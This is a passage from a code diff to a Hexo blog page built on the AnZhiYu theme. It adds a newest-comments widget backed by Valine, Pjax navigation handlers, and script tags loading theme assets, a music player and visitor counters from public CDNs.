-      utils.js('/js/plugins/copycode.js');
+
+    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
+      .then(response => response.json())
+      .then(data => {
+        const valineArray = data.results.map(function (e) {
+          return {
+            'avatar': getIcon(e.QQAvatar, e.mail),
+            'content': changeContent(e.comment),
+            'nick': e.nick,
+            'url': e.url + '#' + e.objectId,
+            'date': e.updatedAt,
+          }
+        })
+        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
+        generateHtml(valineArray)
+      }).catch(e => {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
+      }) 
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('valine-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
     }
-  });
-</script>
+  }
 
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
 
-<!-- inject -->
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
 
-</div></body></html>
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
